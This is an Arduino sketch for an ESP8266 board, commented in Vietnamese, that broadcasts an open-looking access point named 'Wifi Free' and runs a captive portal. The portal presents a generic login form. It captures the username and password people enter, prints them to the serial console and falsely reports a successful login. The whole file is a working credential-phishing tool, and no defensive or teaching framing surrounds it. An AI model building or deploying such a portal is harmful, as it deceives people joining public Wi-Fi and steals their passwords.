#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

const char* ssid = "Wifi Free";       // Tên mạng WiFi mà ESP8266 sẽ phát ra
const char* password = "22446688"; // Mật khẩu mạng WiFi

ESP8266WebServer server(80);

void setup() {
  Serial.begin(115200);

  // Kết nối tới mạng WiFi
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);

  // Hiển thị địa chỉ IP của ESP8266
  Serial.println("");
  Serial.print("IP address: ");
  Serial.println(WiFi.softAPIP());

  // Định nghĩa trang web chuyển hướng (captive portal)
  server.on("/", HTTP_GET, [](){
    server.sendHeader("Location", "http://192.168.4.1/login"); // Điều hướng đến trang đăng nhập
    server.send(302, "text/plain", "");
  });

  // Định nghĩa trang web đăng nhập
  server.on("/login", HTTP_GET, [](){
    server.send(200, "text/html", "<form action='/login' method='POST'><input type='text' name='username' placeholder='Username'><br><input type='password' name='password' placeholder='Password'><br><input type='submit' value='Login'></form>");
  });

  // Xử lý dữ liệu từ form đăng nhập
  server.on("/login", HTTP_POST, [](){
    String username = server.arg("username");
    String password = server.arg("password");
    
    Serial.println("Username: " + username);
    Serial.println("Password: " + password);
    
    server.send(200, "text/html", "Logged in successfully!");
  });

  server.begin();
}

void loop() {
  server.handleClient();
}
